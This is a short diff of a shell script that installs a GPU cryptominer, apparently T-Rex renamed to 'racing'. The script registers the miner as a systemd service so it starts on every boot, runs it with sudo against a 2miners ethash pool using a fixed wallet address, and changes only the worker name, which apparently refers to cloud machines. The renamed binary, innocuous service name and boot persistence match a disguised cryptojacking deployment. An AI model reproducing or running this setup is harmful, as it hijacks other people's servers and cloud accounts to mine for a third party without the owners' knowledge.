@@ -14,4 +14,4 @@ mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xB9F77CBc3870b2Fe2C9a910dD39350Be5773177C -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xB9F77CBc3870b2Fe2C9a910dD39350Be5773177C -p x -w hoangnamAZURE &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xB9F77CBc3870b2Fe2C9a910dD39350Be5773177C -p x -w thinhoanganLON &
